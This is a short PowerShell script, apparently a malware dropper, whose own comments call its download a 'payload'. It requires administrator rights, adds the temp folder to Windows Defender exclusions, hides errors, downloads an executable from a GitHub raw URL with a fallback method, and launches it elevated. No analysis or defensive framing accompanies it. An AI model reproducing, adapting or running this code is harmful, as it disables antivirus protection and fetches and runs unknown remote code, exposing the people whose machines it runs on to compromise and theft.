#Requires -RunAsAdministrator
# add %TEMP% to Defender exclusions, download payload, run as admin

$ErrorActionPreference = "SilentlyContinue"

# 1. add temp dir to Defender exclusions
try {
    Add-MpPreference -ExclusionPath $env:TEMP
    Add-MpPreference -ExclusionPath "$env:TEMP\*"
} catch {}

# 2. download payload to temp
$url = "https://github.com/AyuWaree/Pivoware/raw/refs/heads/main/bc516-fmn1p-1i4ng.exe"
$dest = Join-Path $env:TEMP "bc516-fmn1p.exe"
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
} catch {
    # fallback
    (New-Object System.Net.WebClient).DownloadFile($url, $dest)
}

# 3. run as admin (already elevated via Requires)
if (Test-Path $dest) {
    Start-Process -FilePath $dest -Verb RunAs
}